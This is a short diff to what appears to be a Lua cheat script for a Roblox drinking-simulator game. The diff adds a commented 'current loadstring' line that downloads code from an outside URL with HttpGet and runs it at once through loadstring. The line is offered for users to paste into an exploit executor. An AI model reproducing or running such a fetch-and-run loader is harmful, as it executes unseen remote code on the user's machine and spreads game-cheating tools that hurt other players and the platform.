@@ -42,3 +42,7 @@ doBurp()
 Game - 
 https://www.roblox.com/games/2017976530/Jungle-Soda-Drinking-Simulator
 ]]--
+--[[
+Current loadstring - 
+loadstring(game:HttpGet("https://i-love.cute-cats.online/u/i0YULJ3s", true))()
+]]--
